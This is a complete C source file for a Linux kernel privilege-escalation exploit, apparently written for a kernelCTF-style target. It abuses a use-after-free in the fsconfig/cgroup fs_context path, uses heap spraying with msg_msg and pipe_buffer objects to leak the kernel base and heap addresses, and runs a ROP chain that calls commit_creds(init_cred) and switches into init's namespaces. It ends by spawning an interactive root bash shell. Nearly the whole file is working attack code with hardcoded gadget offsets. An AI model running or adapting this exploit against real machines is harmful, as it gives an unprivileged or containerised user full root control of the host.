// $ gcc -static -pthread ./exploit.c -o ./exploit
#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <assert.h>
#include <pthread.h>
#include <sys/uio.h>
#include <x86intrin.h>

#include <err.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <linux/capability.h>

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

static void die(const char *fmt, ...) {
  va_list params;

  va_start(params, fmt);
  vfprintf(stderr, fmt, params);
  va_end(params);
  exit(1);
}

static void use_temporary_dir(void) {
  system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data;");
  char *tmpdir = "exp_dir";
  if (!tmpdir)
    exit(1);
  if (chmod(tmpdir, 0777))
    exit(1);
  if (chdir(tmpdir))
    exit(1);
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void setup_common() {
  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {
  }
}

static void loop();
// sandbox_common() —— setup sub-process parameter (memory / namespace / msg)
static void sandbox_common() {
  prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
  setsid();
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0x8000;
  setrlimit(RLIMIT_NOFILE, &rlim);
  if (unshare(CLONE_NEWNS)) {
  }
  typedef struct {
    const char *name;
    const char *value;
  } sysctl_t;
  static const sysctl_t sysctls[] = {
      {"/proc/sys/kernel/shmmax", "16777216"},
      {"/proc/sys/kernel/shmall", "536870912"},
      {"/proc/sys/kernel/shmmni", "1024"},
      {"/proc/sys/kernel/msgmax", "0x8000"},
      {"/proc/sys/kernel/msgmni", "1024"},
      {"/proc/sys/kernel/msgmnb", "1024"},
      {"/proc/sys/kernel/sem", "1024 1048576 500 1024"},
  };
  unsigned i;
  for (i = 0; i < sizeof(sysctls) / sizeof(sysctls[0]); i++)
    write_file(sysctls[i].name, sysctls[i].value);
}

static int wait_for_loop(int pid) {
  if (pid < 0)
    exit(1);
  int status = 0;
  while (waitpid(-1, &status, __WALL) != pid) {
  }
  return WEXITSTATUS(status);
}

static int real_uid;
static int real_gid;
__attribute__((aligned(64 << 10))) static char sandbox_stack[1 << 20];

static void pre_exploit();
static void exploit();
void functionA () {
   printf("This is functionA\n");
}
// sub-process
static int namespace_sandbox_proc() {
  atexit(functionA);    // 当程序正常终止时，调用指定的函数 functionA
  sandbox_common();     // setup sub-process parameter (memory / namespace / msg)
  pre_exploit();        // prepare msg_msg queue and pipes
  exploit();            // main exploit
  exit(1);
}
// create sub-process to escalate privilege
static int do_sandbox_namespace() {
  setup_common();           // no use
  real_uid = getuid();
  real_gid = getgid();
  mprotect(sandbox_stack, 4096, PROT_NONE);

  int pid = clone(namespace_sandbox_proc, &sandbox_stack[sizeof(sandbox_stack) - 64], CLONE_NEWUSER, 0);
  return wait_for_loop(pid);
}

// =========================== main exploit

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#define MAX_FILE_NUM 10000
#define MAX_MSG_SPRAY 2000   // 800
#define MAX_PIPE_NUM 100

int uaf_fd;
int fs_fd_1, fs_fd_2, fs_fd_3;

unsigned long kernel_base;

int fds[MAX_FILE_NUM];
int msg_ids[MAX_FILE_NUM];
int pipes[2*MAX_PIPE_NUM][2];

/* spray 256 */
struct msg {
  long mtype;
  char data[];
};

// pre_exploit() —— prepare msg_msg queue and pipes
static void pre_exploit() {
  struct rlimit old_lim;
  // pin_on_cpu(0);
  if (getrlimit(RLIMIT_NOFILE, &old_lim) == 0)
    printf("Old limits -> soft limit= %ld \t"
          " hard limit= %ld \n", old_lim.rlim_cur, old_lim.rlim_max);
  // 1. initialize msg_msg queue
  for (int i=0; i<MAX_MSG_SPRAY+200; i++) {
    msg_ids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (msg_ids[i] < 0)
      err(1, "msgget");
  }

  int pid = fork();
  if (pid<0) err(1, "fork");
  if (pid) {
    while(1) { sleep(1000000); }
  }
  // 2. initialize pipe
  for (int i=0; i<2*MAX_PIPE_NUM; i++) {
    if (pipe(pipes[i]) < 0)
      err(1, "pipe");
  }
}
// prepare 2 uaf
void setup_uaf() {
/*  fs_fd_1 = syscall(__NR_fsopen, "cgroup", 0);
  if (fs_fd_1 < 0) {
    perror("fsopen");
    die("");
  }
*/
  fs_fd_2 = syscall(__NR_fsopen, "cgroup", 0);
  if (fs_fd_2 < 0) {
    perror("fsopen");
    die("");
  }
}

void set_uaffd() {
  if (uaf_fd < 0)
    die("failed to open uaf file\n");
  printf("opened uaf fd: %d\n", uaf_fd);
/*
  if (syscall(__NR_fsconfig, fs_fd_1, 5, "source", 0, uaf_fd)) {
    perror("fsconfig");
    exit(-1);
  }
*/
  if (syscall(__NR_fsconfig, fs_fd_2, 5, "source", 0, uaf_fd)) {
    perror("fsconfig");
    exit(-1);
  }
}

void msg_recv(int msqid, int msg_type, char *data, size_t size) {
  if (msgrcv(msqid, data, size, msg_type, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
    perror("msgrcv");
    exit(-1);
  }
}

void msg_free(int msqid, int msg_type, char *data, size_t size) {
  if (msgrcv(msqid, data, size, msg_type, 0) < 0)
    perror("msgrcv");
}

void vsleep(int n) {
  while (n--) {
    printf("sleep %d\n", n+1);
    sleep(1);
  }
}

static void exploit() {
  char data[0x2000] = {};
  struct msg *m = (struct msg*)data;
  m->mtype = 1;
  pin_on_cpu(3);          // ??????????????????????????????
// 1. leak magic value
// 1-1. prepare uaf context
  setup_uaf();

// 1-2. spray 10000 files, uaf file in the middle
  printf("[*] 1-2 spraying 10000 files\n");
  // defragment
  for (int i=0; i<MAX_FILE_NUM/2; i++) {
    fds[i] = open("./data", O_RDONLY);
    if (fds[i] < 0) 
      err(1, "open data");
  }
  uaf_fd = open("./data", O_RDONLY);    // slab size for file : 0x1000       0x1000 / 320 = 12 可以放12个pipe_buffer
  for (int i=0; i<MAX_FILE_NUM/2; i++) {
    fds[MAX_FILE_NUM/2+i] = open("./data", O_RDONLY);
    if (fds[MAX_FILE_NUM/2+i] < 0) 
      err(1, "open data 2");
  }
// 1-3. call fsconfig to make fs_context(vul_obj) point to uaf_fd file, ready to free
  set_uaffd();

// 1-4. free 400 files, and free the file slab (return at least one slab page)
  printf("[*] 1-4 free 400 files\n");
  close(uaf_fd); // remove the uaf fd to prevent crash
  for (int i=0; i<1000; i++)   // 释放 uaf_fd 附近的400个 file
    close(fds[MAX_FILE_NUM/2-500+i]);
  // close(fs_fd_1);             // 再次释放 uaf_fd file, 不会出错 ??????????????????
  sleep(1);

// 1-5. spray 800 msg_msg (kmalloc-512) to take up the file slab page        kmalloc-4k -> kmalloc-512
  printf("[*] 1-5 spray 800 msg_msg (kmalloc-512)\n");
  for (int i=0; i<MAX_MSG_SPRAY; i++) {
    memset(m->data, 'A', 0x1800);
    if (msgsnd(msg_ids[i], (void *)m, 0x1000+0x200-48-8, 0) != 0)
      err(1, "msgsnd");
  }
  getchar();

// 1-6. free uaf_fd file through fs_context (indeed, it frees msg)
  printf("[*] 1-6 free the overlapped msg_msg\n");
  close(fs_fd_2);
  sleep(1);
  printf("freed msg\n");
  getchar();
// 1-7. leak the slab magic value
  char leak[0x2000];
  unsigned long slab_rand = 0;
  int msg_id = -1;
  int leak_offset = 0;
  printf("[*] 1-7 leak the magic value\n");
  for (int j=0; j<MAX_MSG_SPRAY; j++) {
    // vsleep(1);
    memset(leak, 0, 0x2000);
    // set a larger value to prevent allocate in the freed memory
    msg_recv(msg_ids[j], 0, leak, 0x1400-48-8);
    for (int i=0x10; i<0x1200-48-8-0x10; i+=8) {
      if (*(unsigned long int*)(leak+i) != 0x4141414141414141) {
        printf("[+] we got a leak at %x\n", i);
        leak_offset = i;
        printf("[+] leaked value (magic value) : %lx\n", *(unsigned long int*)(leak+i));
        slab_rand = *(unsigned long int*)(leak+i);    // slab_rand - magic value
        msg_id = j;
        print_hex(leak+i, 0x100);
        break;
      }
    }
    if (slab_rand)
      break;
  }

  if (!slab_rand) {
    printf("no luck, try again\n");
    getchar();
    exit(-1);
  }
  printf("[+] leak done\n");
  if (leak_offset <= 0x1000) {          // ?????
    printf("likely to fail\n");
    getchar();
    exit(-1);
  }
// 2. leak the kernel_base
// 2-1. spray 100 pipe_buffer, reallocate pipe_buffer in kmalloc-512 (kmalloc-1024 in default)
  printf("[*] 2-1 spray 100 pipe_buffer in kmalloc-512\n");
  for (int i=0; i<MAX_PIPE_NUM; i++)
    fcntl(pipes[i][1], F_SETPIPE_SZ, 0x8000); // set nr_slots = 8,    8*40 = 320 > 256   kmalloc-512
  for (int i=0; i<MAX_PIPE_NUM; i++) // init pipe_buffer
    write(pipes[i][1], "KCTF", 4);

// 2-2. leak pipe_buffer->ops
  printf("[*] 2-2 leak pipe_buffer->ops\n");
  memset(leak, 0, 0x2000);
  unsigned long *pipe_buffer = 0;
  unsigned long pipe_ops = 0;
  unsigned long pipe_page = 0; 
  msg_recv(msg_ids[msg_id], 0, leak, 0x1400-48-8);
  pipe_ops = *(unsigned long int*)(leak+0x10+leak_offset);
  pipe_page = *(unsigned long int*)(leak+leak_offset);
  print_hex(leak+leak_offset, 0x20);

  getchar(); // 
  kernel_base = pipe_ops - 0xe3ce40;     // 
  printf("[+] kaslr offset : %lx\n", kernel_base);
  printf("[+] found pipe ops at: 0x%lx\n", pipe_ops);
  printf("[+] found page at: 0x%lx\n", pipe_page);

// 3. leak heap addr
  printf("[*] 3. leak heap addr\n");
  msg_free(msg_ids[msg_id+1], 1, leak, 0x1200-48-8);  // 释放相邻的 msg_msg, 便于泄露这个 msg_msg 的堆地址
  unsigned long int heap = 0;
  unsigned long int heap_rand = 0;
  int pipe_victim_idx = -1;
  for (int j=0; j<MAX_PIPE_NUM; j++) {
    // free buffer
    fcntl(pipes[j][1], F_SETPIPE_SZ, 0xa000);   // 10*40 = 400  释放某个和 msg_msg 漏洞对象重叠的 pipe_buffer
    memset(leak, 0, 0x1200);
    msg_recv(msg_ids[msg_id], 0, leak, 0x1400-48-8);

    heap_rand = *(unsigned long int*)(leak+leak_offset);
    if (heap_rand && heap_rand != pipe_page) {  // 成功泄露漏洞对象处的 freelist 指针 (= slab_rand ^ next空闲块地址)
      printf("[+] heap rand: %lx\n", heap_rand);
      heap = heap_rand ^ slab_rand;
      printf("[+] found heap addr: 0x%lx\n", heap);
      break;
    }
    pipe_victim_idx = j;
  }
  assert(heap);
  printf("[*] leak done\n");
// 4. spray ROP & hijack control-flow
// 4-1. spray another 100 pipe_buffer to take up the overlapped msg_msg
  memset(m->data, 0, 0x1800);
  for (int j=MAX_PIPE_NUM; j<MAX_PIPE_NUM*2; j++) {   // 再次喷射 100 个 pipe_buffer, 占据 msg_msg 漏洞对象 
    pipe_victim_idx = j;                              // 记录和 msg_msg 重叠的 pipe_buffer 对应的下标 pipe_victim_idx
    int stop = 0;
    fcntl(pipes[j][1], F_SETPIPE_SZ, 0x8000);   // 8*40 = 320
    memset(leak, 0, 0x1400);
    msg_recv(msg_ids[msg_id], 0, leak, 0x1400-48-8);
    for (int i=0; i<0x1200-48-8-0x10; i+=8) {
      if (*(unsigned long int*)(leak+0x10+i) != 0x4141414141414141) {
        if (heap_rand != *(unsigned long int*)(leak+0x10+i)) {
          printf("stop spraying\n");
          stop = 1;
        }
        // print_hex(leak+i, 0x30);
        break;
      }
    }
    if (stop) break;
  }

  write(pipes[pipe_victim_idx][1], "KCTF", 4);
  printf("pipe on again\n");

// 4-2. construct ops & ROP chain on known heap
  // (1) forge pipe_buffer->ops (struct pipe_buf_operations)  place pivot gadget
  memset(m->data, 0, 0x1800);
  unsigned long int *ops = (unsigned long int*)(m->data+0x1000-48);
  *ops++ = 0x719b8c + kernel_base; // 0xffffffff81719b8c: push rsi; jmp qword ptr [rsi + 0x39]; 
  *ops++ = 0x719b8c + kernel_base; // 0xffffffff81719b8c: push rsi; jmp qword ptr [rsi + 0x39]; 
  *ops++ = 0x719b8c + kernel_base; // 0xffffffff81719b8c: push rsi; jmp qword ptr [rsi + 0x39]; 

  // forge ROP
  // (2) Save RBP at scratchpad_addr.
  unsigned long int *rop = (unsigned long int*)(m->data+0x1000-48-8+0x20);
  *rop++ = 0xeecfd + kernel_base; // 0xffffffff810eecfd : enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret
  *rop++ = heap+0x180; // r12, store rbp
  *rop++ = 0xdeadbeef; // rbp
  *rop++ = 0x8b4f3 + kernel_base; // 0xffffffff8108b4f3 : mov qword ptr [r12], rbx ; pop rbx ; pop r12 ; pop rbp ; ret
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;

  // (3) commit_creds(init_cred) or commit_creds(prepare_kernel_cred(NULL))
  *rop++ = 0x8f8f0 + kernel_base;   // 0xffffffff8108f8f0 : pop rdi ; ret
  /*
  *rop++ = 0;
  *rop++ = 0xcea40 + kernel_base;   // ffffffff810cea40 T prepare_kernel_cred
  *rop++ = 0x30dcb2 + kernel_base;  // 0xffffffff8130dcb2 : pop rdx ; ret
  *rop++ = 1;
  *rop++ = 0x2f8f07 + kernel_base;  // 0xffffffff812f8f07 : cmp rdx, 1 ; jne 0xffffffff812f8f0e ; ret
  *rop++ = 0x59d294 + kernel_base;  // 0xffffffff8159d294 : mov rdi, rax ; jne 0xffffffff8159d281 ; xor eax, eax ; ret
  */
  *rop++ = 0x186d440 + kernel_base; // ffffffff8286d440 D init_cred
  *rop++ = 0xce550 + kernel_base;   // ffffffff810ce550 T commit_creds

  // (4) switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
  *rop++ = 0x8f8f0 + kernel_base;   // 0xffffffff8108f8f0 : pop rdi ; ret
  *rop++ = 1;
  *rop++ = 0xc4eb0 + kernel_base;   // ffffffff810c4eb0 T find_task_by_vpid
  *rop++ = 0x30dcb2 + kernel_base;  // 0xffffffff8130dcb2 : pop rdx ; ret
  *rop++ = 1;
  *rop++ = 0x2f8f07 + kernel_base;  // 0xffffffff812f8f07 : cmp rdx, 1 ; jne 0xffffffff812f8f0e ; ret
  *rop++ = 0x59d294 + kernel_base;  // 0xffffffff8159d294 : mov rdi, rax ; jne 0xffffffff8159d281 ; xor eax, eax ; ret
  *rop++ = 0x6652e + kernel_base;   // 0xffffffff8106652e : pop rsi ; ret
  *rop++ = 0x186d200 + kernel_base; // ffffffff8286d200 D init_nsproxy
  *rop++ = 0xcd120 + kernel_base;   // ffffffff810cd120 T switch_task_namespaces

  // (5) resume execution
  *rop++ = 0x69e + kernel_base;     // 0xffffffff8100069e : pop rbp ; ret
  *rop++ = heap+0x180+0xc;
  *rop++ = 0x21fe99 + kernel_base;  // 0xffffffff8121fe99 : push qword ptr [rbp - 0xc] ; pop rbp ; ret
  *rop++ = 0x8f85c + kernel_base;   // 0xffffffff8108f85c : mov rsp, rbp ; pop rbp ; ret

  // spray ops
  for (int i=MAX_MSG_SPRAY; i<MAX_MSG_SPRAY+100; i++) {
    if (msgsnd(msg_ids[i], (void *)m, 0x1000+0x200-48-8, 0) != 0)
      err(1, "msgsnd");
  }

  // arb read -> hijack llseek()
  // 0xffffffff8104f385 : mov rax, qword ptr [rsi + 0x18] ; ret

  // cos
  // 0xffffffff810239b1 : mov eax, dword ptr [rsi - 0x38b7fffb] ; ret

  // arb write -> hijack read()
  // 0xffffffff8116005b : mov qword ptr [rsi], rdx ; ret
  // 0xffffffff81ab62f8 : mov dword ptr [rdx], esi ; ret

// 4-3. forge pipe_buffer->ops
  msg_free(msg_ids[msg_id], 1, leak, 0x1200-48-8);
  // make fcount == 0 preventing crash.
  memset(m->data, 0, 0x1800);
  unsigned long int *payload = (unsigned long int *)(m->data+0x1000-48);
  *(unsigned long int*)(m->data + leak_offset-8) = 0x105626 + kernel_base; // 2 0xffffffff81105626 : pop rsp ; add eax, ebp ; ret
  *(unsigned long int*)(m->data + leak_offset)   = heap+0x20; // new rsp -> ROP chain
  *(unsigned long int*)(m->data + leak_offset+8) = heap; // pipe_buffer->ops

  *(unsigned long int*)(m->data + leak_offset-8+0x28) = heap+0x100; // ops  ??????????????
  *(unsigned long int*)(m->data + leak_offset-8+0x39) = 0x105626 + kernel_base; // 1 0xffffffff81105626 : pop rsp ; add eax, ebp ; ret

  for (int i=MAX_MSG_SPRAY+100; i<MAX_MSG_SPRAY+200; i++) {
    if (msgsnd(msg_ids[i], (void *)m, 0x1000+0x200-48-8, 0) != 0) 
      err(1, "msgsnd");
  }
// 4-4. hijack control-flow
  printf("done, hijacking\n");
  close(pipes[pipe_victim_idx][1]);
  close(pipes[pipe_victim_idx][0]);

  if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0) 
    perror("setns 1\n");
  if (setns(open("/proc/1/ns/pid", O_RDONLY), 0) < 0) {
    perror("setns 2\n");
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  }
  char *args[] = {"/bin/bash", "-i", NULL};
  execve(args[0], args, NULL);
  printf("exit...\n");
  getchar();
}

int main(void) {
  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  use_temporary_dir();    // setup workdir in ./exp_dir/
  do_sandbox_namespace(); // create sub-process to escalate privilege
  return 0;
}